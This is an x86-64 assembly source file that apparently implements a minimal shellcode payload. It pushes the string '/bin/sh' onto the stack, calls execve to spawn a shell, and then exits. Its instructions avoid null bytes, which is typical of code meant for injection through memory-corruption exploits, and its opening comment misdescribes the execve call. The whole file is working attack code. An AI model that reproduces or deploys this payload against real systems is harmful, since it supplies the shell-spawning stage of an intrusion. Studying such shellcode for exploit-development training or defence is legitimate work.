.intel_syntax noprefix
.include "../include/gas.s"

.global _start


.text

_start:

    # sys_execve(STDOUT, buffer, rbx)
    # setup argv[]
    xor rdx, rdx
    mov rdi, 0x68732f6e69622f2f
    shr rdi, 8
    push rdi
    mov rdi, rsp
    push rdx
    push rdi
    mov rsi, rsp
    xor rax, rax
    mov al, SYS_EXECVE
    syscall

    # sys_exit(0)
    xor rdi, rdi
    xor rax, rax
    mov al, SYS_EXIT
    syscall
